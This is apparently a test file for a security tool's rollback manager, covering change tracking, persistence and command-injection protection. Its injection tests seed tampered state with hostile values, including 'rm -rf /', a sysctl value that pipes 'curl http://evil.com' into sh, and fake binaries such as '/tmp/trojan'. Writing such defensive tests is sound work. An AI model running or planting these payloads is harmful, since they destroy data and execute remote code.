import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { mkdtempSync, rmSync, readFileSync, writeFileSync, existsSync, statSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";

/**
 * RollbackManager is a singleton that reads from ~/.defense-mcp/rollback-state.json.
 * To test it in isolation we dynamically import a fresh module for each test,
 * pointing HOME at a temp directory so it picks up an isolated state file.
 */

describe("rollback", () => {
    let tempDir: string;
    let defenseDir: string;
    let statePath: string;

    const origHome = process.env.HOME;

    beforeEach(() => {
        tempDir = mkdtempSync(join(tmpdir(), "defense-rollback-test-"));
        defenseDir = join(tempDir, ".defense-mcp");
        statePath = join(defenseDir, "rollback-state.json");

        // Point HOME to the temp directory so RollbackManager uses our isolated dir
        process.env.HOME = tempDir;
    });

    afterEach(() => {
        rmSync(tempDir, { recursive: true, force: true });
        if (origHome === undefined) {
            delete process.env.HOME;
        } else {
            process.env.HOME = origHome;
        }
    });

    /**
     * Helper: create a fresh RollbackManager by resetting the singleton.
     * We import it dynamically and clear the module's singleton state.
     */
    async function createFreshManager() {
        // We need to work around the singleton pattern.
        // Import the module, then use reflection to reset the singleton.
        const mod = await import("../../src/core/rollback.js");
        const RollbackManager = mod.RollbackManager;

        // Reset singleton via reflection
        (RollbackManager as unknown as Record<string, unknown>)["instance"] = null;

        return RollbackManager.getInstance();
    }

    /**
     * Helper: import the RollbackCommand type for use in tests.
     */
    async function importTypes() {
        return await import("../../src/core/rollback.js");
    }

    // ── Constructor / initialization ──────────────────────────────────────

    describe("initialization", () => {
        it("should create a RollbackManager instance", async () => {
            const manager = await createFreshManager();
            expect(manager).toBeDefined();
        });

        it("should have a session ID (UUID format)", async () => {
            const manager = await createFreshManager();
            const sessionId = manager.getSessionId();
            expect(sessionId).toMatch(
                /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i
            );
        });

        it("should start with empty changes when no state file exists", async () => {
            const manager = await createFreshManager();
            const changes = manager.listChanges();
            expect(changes).toEqual([]);
        });

        it("should generate unique session IDs on each instance reset", async () => {
            const m1 = await createFreshManager();
            const s1 = m1.getSessionId();

            const m2 = await createFreshManager();
            const s2 = m2.getSessionId();

            expect(s1).not.toBe(s2);
        });
    });

    // ── trackChange ──────────────────────────────────────────────────────

    describe("trackChange", () => {
        it("should add a change record", async () => {
            const manager = await createFreshManager();
            manager.trackChange("op-1", "sysctl", "net.ipv4.ip_forward", "0");

            const changes = manager.listChanges();
            expect(changes.length).toBe(1);
            expect(changes[0].operationId).toBe("op-1");
            expect(changes[0].type).toBe("sysctl");
            expect(changes[0].target).toBe("net.ipv4.ip_forward");
            expect(changes[0].originalValue).toBe("0");
        });

        it("should generate a UUID for each change record", async () => {
            const manager = await createFreshManager();
            manager.trackChange("op-1", "file", "/etc/test", "backup-path");

            const changes = manager.listChanges();
            expect(changes[0].id).toMatch(
                /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i
            );
        });

        it("should record the session ID on each change", async () => {
            const manager = await createFreshManager();
            const sessionId = manager.getSessionId();
            manager.trackChange("op-1", "firewall", "INPUT", "iptables -D INPUT 1");

            const changes = manager.listChanges();
            expect(changes[0].sessionId).toBe(sessionId);
        });

        it("should set rolledBack to false for new changes", async () => {
            const manager = await createFreshManager();
            manager.trackChange("op-1", "service", "ssh.service", "active");

            const changes = manager.listChanges();
            expect(changes[0].rolledBack).toBe(false);
        });

        it("should record an ISO timestamp", async () => {
            const manager = await createFreshManager();
            manager.trackChange("op-1", "sysctl", "kernel.sysrq", "1");

            const changes = manager.listChanges();
            const date = new Date(changes[0].timestamp);
            expect(date.getTime()).not.toBeNaN();
            expect(changes[0].timestamp).toMatch(/^\d{4}-\d{2}-\d{2}T/);
        });

        it("should accept an optional changelogRef", async () => {
            const manager = await createFreshManager();
            manager.trackChange("op-1", "file", "/etc/test", "backup-path", "changelog-id-123");

            const changes = manager.listChanges();
            expect(changes[0].changelogRef).toBe("changelog-id-123");
        });

        it("should track multiple changes", async () => {
            const manager = await createFreshManager();
            manager.trackChange("op-1", "sysctl", "net.ipv4.ip_forward", "0");
            manager.trackChange("op-1", "sysctl", "net.ipv4.conf.all.rp_filter", "1");
            manager.trackChange("op-2", "file", "/etc/ssh/sshd_config", "/backup/sshd_config");

            const changes = manager.listChanges();
            expect(changes.length).toBe(3);
        });

        it("should accept a structured rollbackCommand", async () => {
            const manager = await createFreshManager();
            manager.trackChange(
                "op-fw-1",
                "firewall",
                "INPUT",
                "iptables -D INPUT -s 1.2.3.4 -j DROP",
                undefined,
                { command: "iptables", args: ["-D", "INPUT", "-s", "1.2.3.4", "-j", "DROP"] }
            );

            const changes = manager.listChanges();
            expect(changes.length).toBe(1);
            expect(changes[0].rollbackCommand).toEqual({
                command: "iptables",
                args: ["-D", "INPUT", "-s", "1.2.3.4", "-j", "DROP"],
            });
        });

        it("should persist rollbackCommand to disk", async () => {
            const manager = await createFreshManager();
            manager.trackChange(
                "op-fw-2",
                "firewall",
                "INPUT",
                "iptables -D INPUT -s 10.0.0.1 -j REJECT",
                undefined,
                { command: "iptables", args: ["-D", "INPUT", "-s", "10.0.0.1", "-j", "REJECT"] }
            );

            // Read the state file directly
            const raw = readFileSync(statePath, "utf-8");
            const state = JSON.parse(raw);
            expect(state.changes[0].rollbackCommand).toEqual({
                command: "iptables",
                args: ["-D", "INPUT", "-s", "10.0.0.1", "-j", "REJECT"],
            });
        });

        it("should not include rollbackCommand when not provided", async () => {
            const manager = await createFreshManager();
            manager.trackChange("op-1", "sysctl", "net.ipv4.ip_forward", "0");

            const changes = manager.listChanges();
            expect(changes[0].rollbackCommand).toBeUndefined();
        });
    });

    // ── Persistence / save ───────────────────────────────────────────────

    describe("persistence", () => {
        it("should save state to disk on trackChange", async () => {
            const manager = await createFreshManager();
            manager.trackChange("op-1", "sysctl", "net.ipv4.ip_forward", "0");

            // The state file should exist
            expect(existsSync(statePath)).toBe(true);
        });

        it("should write versioned state format", async () => {
            const manager = await createFreshManager();
            manager.trackChange("op-1", "file", "/etc/test", "backup-path");

            const raw = readFileSync(statePath, "utf-8");
            const state = JSON.parse(raw);
            expect(state.version).toBe(1);
            expect(Array.isArray(state.changes)).toBe(true);
            expect(state.changes.length).toBe(1);
        });

        it("should write state file with secure permissions (0o600)", async () => {
            const manager = await createFreshManager();
            manager.trackChange("op-1", "sysctl", "test.key", "old-value");

            const stats = statSync(statePath);
            expect(stats.mode & 0o777).toBe(0o600);
        });

        it("should persist and reload changes across instances", async () => {
            // Track changes with first manager
            const m1 = await createFreshManager();
            m1.trackChange("op-1", "sysctl", "net.ipv4.ip_forward", "0");
            m1.trackChange("op-2", "file", "/etc/test", "backup-path");

            // Create a new manager (simulating server restart)
            const m2 = await createFreshManager();
            const changes = m2.listChanges();
            expect(changes.length).toBe(2);
        });
    });

    // ── Migration from old format ────────────────────────────────────────

    describe("migration", () => {
        it("should migrate old bare-array format", async () => {
            const { secureMkdirSync, secureWriteFileSync } = await import("../../src/core/secure-fs.js");
            secureMkdirSync(defenseDir);

            // Write old format (bare array, no version envelope)
            const oldData = [
                {
                    id: "old-id-1",
                    operationId: "old-op",
                    sessionId: "old-session",
                    type: "sysctl",
                    target: "net.ipv4.ip_forward",
                    originalValue: "0",
                    timestamp: "2024-01-01T00:00:00.000Z",
                    rolledBack: false,
                },
            ];
            secureWriteFileSync(statePath, JSON.stringify(oldData), "utf-8");

            const manager = await createFreshManager();
            const changes = manager.listChanges();
            expect(changes.length).toBe(1);
            expect(changes[0].operationId).toBe("old-op");
        });

        it("should handle corrupt state file gracefully", async () => {
            const { secureMkdirSync, secureWriteFileSync } = await import("../../src/core/secure-fs.js");
            secureMkdirSync(defenseDir);

            // Write corrupt data
            secureWriteFileSync(statePath, "not valid json {{", "utf-8");

            const manager = await createFreshManager();
            const changes = manager.listChanges();
            expect(changes).toEqual([]);
        });
    });

    // ── listChanges sorting ──────────────────────────────────────────────

    describe("listChanges", () => {
        it("should return changes sorted newest first", async () => {
            const { secureMkdirSync, secureWriteFileSync } = await import("../../src/core/secure-fs.js");
            secureMkdirSync(defenseDir);

            // Pre-seed state with known timestamps
            const state = {
                version: 1,
                changes: [
                    {
                        id: "id-1",
                        operationId: "op-1",
                        sessionId: "s1",
                        type: "sysctl",
                        target: "key1",
                        originalValue: "v1",
                        timestamp: "2024-01-01T00:00:00.000Z",
                        rolledBack: false,
                    },
                    {
                        id: "id-2",
                        operationId: "op-2",
                        sessionId: "s1",
                        type: "file",
                        target: "key2",
                        originalValue: "v2",
                        timestamp: "2025-06-15T12:00:00.000Z",
                        rolledBack: false,
                    },
                ],
            };
            secureWriteFileSync(statePath, JSON.stringify(state), "utf-8");

            const manager = await createFreshManager();
            const changes = manager.listChanges();
            expect(changes[0].id).toBe("id-2"); // Newer
            expect(changes[1].id).toBe("id-1"); // Older
        });

        it("should return a copy (not a reference to internal array)", async () => {
            const manager = await createFreshManager();
            manager.trackChange("op-1", "sysctl", "key", "val");

            const changes1 = manager.listChanges();
            const changes2 = manager.listChanges();
            expect(changes1).not.toBe(changes2); // Different array instances
            expect(changes1).toEqual(changes2);   // Same content
        });
    });

    // ── rollback ─────────────────────────────────────────────────────────

    describe("rollback", () => {
        it("should throw when no changes found for operation", async () => {
            const manager = await createFreshManager();
            await expect(manager.rollback("nonexistent-op")).rejects.toThrow(
                /no pending changes/i
            );
        });

        it("should throw when no changes found for session", async () => {
            const manager = await createFreshManager();
            await expect(manager.rollbackSession("nonexistent-session")).rejects.toThrow(
                /no pending changes/i
            );
        });
    });

    // ── CORE-003: Injection protection ───────────────────────────────────

    describe("CORE-003: rollback command injection protection", () => {
        it("should block firewall rollback with non-allowlisted command in originalValue", async () => {
            const { secureMkdirSync, secureWriteFileSync } = await import("../../src/core/secure-fs.js");
            secureMkdirSync(defenseDir);

            // Simulate a tampered state file with a non-allowlisted command
            const state = {
                version: 1,
                changes: [
                    {
                        id: "tampered-1",
                        operationId: "evil-op",
                        sessionId: "evil-session",
                        type: "firewall",
                        target: "INPUT",
                        originalValue: "/tmp/evil-binary -D INPUT -s 1.2.3.4 -j DROP",
                        timestamp: "2025-01-01T00:00:00.000Z",
                        rolledBack: false,
                    },
                ],
            };
            secureWriteFileSync(statePath, JSON.stringify(state), "utf-8");

            const manager = await createFreshManager();
            const changes = manager.listChanges();
            expect(changes.length).toBe(1);

            // The rollback should fail silently (logs error) because
            // /tmp/evil-binary is not in the allowlist
            const consoleSpy = vi.spyOn(console, "error").mockImplementation(() => {});
            try {
                await manager.rollback("evil-op");
                // After rollback attempt, verify the record was NOT marked as rolled back
                const postChanges = manager.listChanges();
                expect(postChanges[0].rolledBack).toBe(false);
                // Verify error was logged about allowlist
                expect(consoleSpy).toHaveBeenCalledWith(
                    expect.stringContaining("not in the command allowlist")
                );
            } finally {
                consoleSpy.mockRestore();
            }
        });

        it("should block firewall rollback with shell injection in originalValue", async () => {
            const { secureMkdirSync, secureWriteFileSync } = await import("../../src/core/secure-fs.js");
            secureMkdirSync(defenseDir);

            // Simulate a tampered state file with shell metacharacters injected
            const state = {
                version: 1,
                changes: [
                    {
                        id: "tampered-2",
                        operationId: "inject-op",
                        sessionId: "inject-session",
                        type: "firewall",
                        target: "INPUT",
                        originalValue: "bash -c 'rm -rf /'",
                        timestamp: "2025-01-01T00:00:00.000Z",
                        rolledBack: false,
                    },
                ],
            };
            secureWriteFileSync(statePath, JSON.stringify(state), "utf-8");

            const manager = await createFreshManager();
            const consoleSpy = vi.spyOn(console, "error").mockImplementation(() => {});
            try {
                await manager.rollback("inject-op");
                const postChanges = manager.listChanges();
                expect(postChanges[0].rolledBack).toBe(false);
                expect(consoleSpy).toHaveBeenCalledWith(
                    expect.stringContaining("not in the command allowlist")
                );
            } finally {
                consoleSpy.mockRestore();
            }
        });

        it("should block firewall rollback with non-allowlisted command in rollbackCommand field", async () => {
            const { secureMkdirSync, secureWriteFileSync } = await import("../../src/core/secure-fs.js");
            secureMkdirSync(defenseDir);

            // Simulate a tampered state file with structured but non-allowlisted command
            const state = {
                version: 1,
                changes: [
                    {
                        id: "tampered-3",
                        operationId: "struct-evil-op",
                        sessionId: "struct-evil-session",
                        type: "firewall",
                        target: "INPUT",
                        originalValue: "iptables -D INPUT -s 1.2.3.4 -j DROP",
                        rollbackCommand: {
                            command: "/tmp/trojan",
                            args: ["-D", "INPUT"],
                        },
                        timestamp: "2025-01-01T00:00:00.000Z",
                        rolledBack: false,
                    },
                ],
            };
            secureWriteFileSync(statePath, JSON.stringify(state), "utf-8");

            const manager = await createFreshManager();
            const consoleSpy = vi.spyOn(console, "error").mockImplementation(() => {});
            try {
                await manager.rollback("struct-evil-op");
                const postChanges = manager.listChanges();
                expect(postChanges[0].rolledBack).toBe(false);
                expect(consoleSpy).toHaveBeenCalledWith(
                    expect.stringContaining("not in the command allowlist")
                );
            } finally {
                consoleSpy.mockRestore();
            }
        });

        it("should block sysctl rollback with invalid key (shell metacharacters)", async () => {
            const { secureMkdirSync, secureWriteFileSync } = await import("../../src/core/secure-fs.js");
            secureMkdirSync(defenseDir);

            const state = {
                version: 1,
                changes: [
                    {
                        id: "tampered-sysctl-1",
                        operationId: "sysctl-evil-op",
                        sessionId: "sysctl-evil-session",
                        type: "sysctl",
                        target: "net.ipv4.ip_forward; rm -rf /",
                        originalValue: "0",
                        timestamp: "2025-01-01T00:00:00.000Z",
                        rolledBack: false,
                    },
                ],
            };
            secureWriteFileSync(statePath, JSON.stringify(state), "utf-8");

            const manager = await createFreshManager();
            const consoleSpy = vi.spyOn(console, "error").mockImplementation(() => {});
            try {
                await manager.rollback("sysctl-evil-op");
                const postChanges = manager.listChanges();
                expect(postChanges[0].rolledBack).toBe(false);
                expect(consoleSpy).toHaveBeenCalledWith(
                    expect.stringContaining("Invalid sysctl key")
                );
            } finally {
                consoleSpy.mockRestore();
            }
        });

        it("should block sysctl rollback with malicious value", async () => {
            const { secureMkdirSync, secureWriteFileSync } = await import("../../src/core/secure-fs.js");
            secureMkdirSync(defenseDir);

            const state = {
                version: 1,
                changes: [
                    {
                        id: "tampered-sysctl-2",
                        operationId: "sysctl-val-evil",
                        sessionId: "sysctl-val-evil-session",
                        type: "sysctl",
                        target: "net.ipv4.ip_forward",
                        originalValue: "0; curl http://evil.com | sh",
                        timestamp: "2025-01-01T00:00:00.000Z",
                        rolledBack: false,
                    },
                ],
            };
            secureWriteFileSync(statePath, JSON.stringify(state), "utf-8");

            const manager = await createFreshManager();
            const consoleSpy = vi.spyOn(console, "error").mockImplementation(() => {});
            try {
                await manager.rollback("sysctl-val-evil");
                const postChanges = manager.listChanges();
                expect(postChanges[0].rolledBack).toBe(false);
                expect(consoleSpy).toHaveBeenCalledWith(
                    expect.stringContaining("Invalid sysctl value")
                );
            } finally {
                consoleSpy.mockRestore();
            }
        });

        it("should block firewall rollback when originalValue is too short", async () => {
            const { secureMkdirSync, secureWriteFileSync } = await import("../../src/core/secure-fs.js");
            secureMkdirSync(defenseDir);

            const state = {
                version: 1,
                changes: [
                    {
                        id: "short-cmd",
                        operationId: "short-op",
                        sessionId: "short-session",
                        type: "firewall",
                        target: "INPUT",
                        originalValue: "iptables",
                        timestamp: "2025-01-01T00:00:00.000Z",
                        rolledBack: false,
                    },
                ],
            };
            secureWriteFileSync(statePath, JSON.stringify(state), "utf-8");

            const manager = await createFreshManager();
            const consoleSpy = vi.spyOn(console, "error").mockImplementation(() => {});
            try {
                await manager.rollback("short-op");
                const postChanges = manager.listChanges();
                expect(postChanges[0].rolledBack).toBe(false);
                expect(consoleSpy).toHaveBeenCalledWith(
                    expect.stringContaining("too short")
                );
            } finally {
                consoleSpy.mockRestore();
            }
        });

        it("should reload structured rollbackCommand from persisted state", async () => {
            // Track a change with structured command
            const m1 = await createFreshManager();
            m1.trackChange(
                "op-persist-1",
                "firewall",
                "INPUT",
                "iptables -D INPUT -s 5.6.7.8 -j DROP",
                undefined,
                { command: "iptables", args: ["-D", "INPUT", "-s", "5.6.7.8", "-j", "DROP"] }
            );

            // Create new manager to simulate restart, verify it loads the structured command
            const m2 = await createFreshManager();
            const changes = m2.listChanges();
            expect(changes.length).toBe(1);
            expect(changes[0].rollbackCommand).toEqual({
                command: "iptables",
                args: ["-D", "INPUT", "-s", "5.6.7.8", "-j", "DROP"],
            });
        });
    });
});
